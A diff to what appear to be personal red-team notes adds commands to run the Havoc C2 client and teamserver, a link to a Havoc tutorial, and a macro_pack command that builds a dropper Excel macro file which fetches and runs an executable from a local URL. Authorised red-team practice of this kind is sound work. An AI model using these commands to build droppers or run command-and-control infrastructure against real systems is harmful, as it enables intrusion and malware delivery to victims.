@@ -478,10 +478,26 @@ can we try evilclippy here
 https://github.com/outflanknl/EvilClippy
 
 
+# running havoc
+
+https://payload.cafe/2022/10/02/havoc-c2-intro-inline-csharp-compilation-within-powershell/
 
 
+```
+cd Havoc/Client
+./Havoc 
+```
+
+```
+sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
+```
+
+https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0
+
+`echo "http://localhost:8099/new.exe" "dropped.exe" | python3 macro_pack.py -o -t Dropper -G "drop.xlsm"`
 
 
+python is not working for some reason needto try with a release version.
 
 
 
